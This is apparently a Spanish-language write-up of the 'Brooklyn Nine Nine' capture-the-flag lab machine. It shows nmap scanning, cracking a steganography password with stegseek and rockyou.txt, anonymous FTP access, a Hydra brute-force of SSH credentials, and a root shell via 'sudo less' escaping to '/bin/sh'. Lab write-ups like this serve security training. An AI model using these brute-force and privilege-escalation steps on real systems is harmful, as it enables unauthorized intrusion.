---
description: '✍️ Autor: Fsociety2006 🔍 Dificultad: Fácil'
---

# Brooklyn Nine Nine

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.255.194
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (432).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap 10.10.255.194
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo, el puerto **21** perteneciendo al servicio **FTP**, el puerto **22** perteneciente al servicio **SSH** y el puerto **80** perteneciente al servicio **HTTP** están abiertos, por lo que se procederá a indagar más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p21,22,80 -v 10.10.255.194
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Se ingresó la dirección IP en el navegador, lo que llevó a que la página web sobre la serie **Brooklyn Nine Nine**. Nos indica que hay redimensionarlo para verlo completamente la imagen.&#x20;

<figure><img src="../../.gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>

De primeras, no se nos muestra nada, por lo que revisamos el código fuente por si hay alguna información oculta relevante.

<figure><img src="../../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

Nos menciona sobre la técnica de estenografía por lo que descargamos la imagen para aplicar esas técnicas a la imagen para ver si hay información oculta.

```bash
wget http://10.10.255.194/brooklyn99.jpg
```

<figure><img src="../../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>

Ahora que tenemos la imagen, podemos verificar si hay un archivo incrustado en la imagen utilizando el siguiente comando:

```bash
steghide info brooklyn99.jpg
```

<figure><img src="../../.gitbook/assets/image (439).png" alt=""><figcaption></figcaption></figure>

Se nos muestra que hay un archivo incrustado en la imagen y que está protegido con una contraseña. Sabiendo esto, utilizamos la herramienta **Stegseek** para intentar descifrar la contraseña utilizando la lista de contraseñas comúnmente usada, `rockyou.txt`. El comando sería el siguiente:

```bash
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (440).png" alt=""><figcaption></figcaption></figure>

Logramos descubrir la contraseña y acceder a los datos ocultos, como se muestra a continuación. Parece tratarse de credenciales del usuario **Holt**.

<figure><img src="../../.gitbook/assets/image (441).png" alt=""><figcaption></figcaption></figure>

Primero intenté iniciar sesión por **SSH** utilizando las credenciales. Así, conseguimos nuestra primera **flag**.

<figure><img src="../../.gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (443).png" alt=""><figcaption></figcaption></figure>

Ahora que hemos encontrado la bandera de usuario, ¡necesitamos obtener acceso **root**!

Después de iniciar sesión como **Holt** a través de **SSH**, exploramos los directorios en busca de algo útil. Desafortunadamente, no encontramos nada. Dado que ya hemos explorado el servidor web y el acceso por **SSH**, nuestro siguiente paso es verificar si podemos hacer algo con **FTP**. Esto implica comprobar si tiene habilitado el acceso anónimo.

Utilizamos el siguiente comando para ello:

```bash
ftp anonymous@10.10.255.194
```

Listamos el contenido del servidor y vemos que hay un archivo de texto llamado `note_to_jake.txt`. Procedemos a descargarlo a nuestra máquina.

<figure><img src="../../.gitbook/assets/image (444).png" alt=""><figcaption></figcaption></figure>

Al leer el archivo de texto, encontramos nuestra siguiente gran pista: el usuario **jake** tiene una contraseña débil.

<figure><img src="../../.gitbook/assets/image (445).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Con la información obtenida anteriormente, realizamos el comando:

```bash
hydra -l jake-P /usr/share/wordlists/rockyou.txt ssh://10.10.255.194 -t 5
```

que utiliza la herramienta **Hydra** para realizar un ataque de fuerza bruta contra el servicio **SSH** de una máquina con la IP **10.10.255.194**.&#x20;

<figure><img src="../../.gitbook/assets/image (446).png" alt=""><figcaption></figcaption></figure>

Al realizar el ataque de fuerza bruta, hemos descubierto la **contraseña** de ese usuario. Sabiendo esto, nos conectamos a través de **SSH** al usuario con el comando:

```bash
ssh jake@10.10.255.194
```

<figure><img src="../../.gitbook/assets/image (447).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (448).png" alt=""><figcaption></figcaption></figure>

Esto muestra que `jake` puede ejecutar el binario `less` con privilegios de sudo. Para ver cómo podemos explotar esto, consultamos [GTFOBins](https://gtfobins.github.io/gtfobins/less/#sudo), que nos proporciona nuestro **exploit**.

Ejecutamos el siguiente comando:

```bash
sudo less /etc/profile
```

Luego, escribimos `!/bin/sh` para abrir una **shell** con privilegios elevados.

<figure><img src="../../.gitbook/assets/image (449).png" alt=""><figcaption></figcaption></figure>

De inmediato, el símbolo del prompt cambia de `$` a `#`, lo que indica que hemos escalado exitosamente nuestros privilegios a root. Luego, navegamos a `/root` y encontramos nuestra última bandera.

<figure><img src="../../.gitbook/assets/image (496).png" alt=""><figcaption></figcaption></figure>
